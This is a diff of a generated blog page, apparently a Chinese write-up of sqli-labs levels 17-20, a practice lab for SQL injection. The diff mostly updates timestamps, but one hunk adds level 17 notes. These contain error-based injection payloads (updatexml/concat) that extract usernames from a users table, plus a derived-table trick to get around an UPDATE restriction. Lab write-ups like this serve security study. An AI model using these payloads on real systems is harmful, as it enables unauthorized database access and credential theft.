@@ -44,7 +44,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-01-07T05:21:15.000Z">
-<meta property="article:modified_time" content="2023-01-08T08:31:04.298Z">
+<meta property="article:modified_time" content="2023-01-09T10:02:08.246Z">
 <meta property="article:author" content="ChenZhengkai10">
 <meta property="article:tag" content="sqli-labs">
 <meta name="twitter:card" content="summary">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1673242444863),
+    lastupdate: new Date(1673258577417),
     sidebar: {
       for_page: ["blogger","category","tagcloud","text"],
       for_post: ["toc"],
@@ -2669,6 +2669,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </blockquote>
 <p>显而易见当前数据库为security</p>
 <p>剩下的就不一一列举出来了</p>
+<p>在访问users表获取username和password时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>无法访问到users</p>
+<p>刚开始还以为是我payload错误</p>
+<p>反复检查没有找到错误</p>
+<p>查看源代码之后发现</p>
+<p><img src="/2023/01/07/sqli-labs-17-20/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230109_174835.png" class="lazyload" data-srcset="/2023/01/07/sqli-labs-17-20/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230109_174835.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>本关不是select而是update</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br></pre></td></tr></table></figure>
+
+<p>查询之后发现本关需要绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from (select username from users)a),1,31),0x7e),3)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>解释一下本关所需要绕过的语句：先查询括号里select username from users，将这里面查询出来的数据作为一个结果集取名为 a，再 select * from a 查询a ,将 结果集a 全部查询出来</strong></p>
+</blockquote>
 <h2 id="sqli-labs-18"><a href="#sqli-labs-18" class="headerlink" title="sqli-labs-18"></a>sqli-labs-18</h2><p>在username和password折腾半天没有什么结果</p>
 <p>输入正确的username和password后发现页面显示User-Agent</p>
 <p>查看index.php文件后发现注入点在user-agent</p>
@@ -2756,10 +2773,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-01-08T16:31:04+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-01-09T18:02:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jan 8, 2023</p>
+    <p>更新于：Jan 9, 2023</p>
   </a>
 </div>
 
@@ -3594,7 +3611,7 @@ sqli-labs-11前10关都是GET型，第11关是为POST型
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"k10."}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/01/07/sqli-labs-17-20/","name":"sqli-labs-17-20"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"k10.","url":"http://example.com/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-17-20","description":"sqli-labs-17-20","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/01/07/sqli-labs-17-20/"},"author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"k10.","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/01/07/sqli-labs-17-20/","wordCount":15,"datePublished":"2023-01-07T05:21:15.000Z","dateModified":"2023-01-08T08:31:04.298Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"k10."}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/01/07/sqli-labs-17-20/","name":"sqli-labs-17-20"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"k10.","url":"http://example.com/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"k10.","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-17-20","description":"sqli-labs-17-20","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/01/07/sqli-labs-17-20/"},"author":{"@type":"Person","name":"ChenZhengkai10","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"k10.","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/01/07/sqli-labs-17-20/","wordCount":15,"datePublished":"2023-01-07T05:21:15.000Z","dateModified":"2023-01-09T10:02:08.246Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
